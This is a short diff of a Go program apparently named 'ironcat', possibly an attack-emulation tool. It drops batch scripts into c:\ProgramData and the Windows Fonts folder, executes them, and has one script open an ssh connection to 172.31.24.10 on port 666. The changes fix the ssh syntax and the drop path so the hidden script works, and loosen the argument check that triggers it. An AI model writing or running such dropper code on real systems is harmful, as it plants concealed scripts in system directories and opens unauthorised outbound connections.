@@ -19,11 +19,11 @@ func batchRun() {
 	f3.WriteString(batString3)
 	exec.Command("c:\\ProgramData\\chtes.bat").Run()
 
-	batString5 := "ssh 172.31.24.10:666"
-	f5, _ := os.Create("c:\\Windows\\System32\\pepper.cmd")
+	batString5 := "ssh -p 666 172.31.24.10"
+	f5, _ := os.Create("c:\\Windows\\Fonts\\pepper.cmd")
 	defer f5.Close()
 	f5.WriteString(batString5)
-	exec.Command("c:\\Windows\\System32\\pepper.bat").Run()
+	exec.Command("c:\\Windows\\Fonts\\pepper.cmd").Run()
 }
 
 func directRun(t string) {
@@ -59,7 +59,7 @@ func main() {
 	//mode := os.Args[1]
 	//t := os.Args[2]
 	arg_count := len(os.Args)-1
-	if arg_count > 2 {
+	if arg_count > 1 {
 	fmt.Println("Beep Boop Meow Meow Meow")
 	fmt.Println("Starting the application...ironcat shall remain")
 		batchRun()
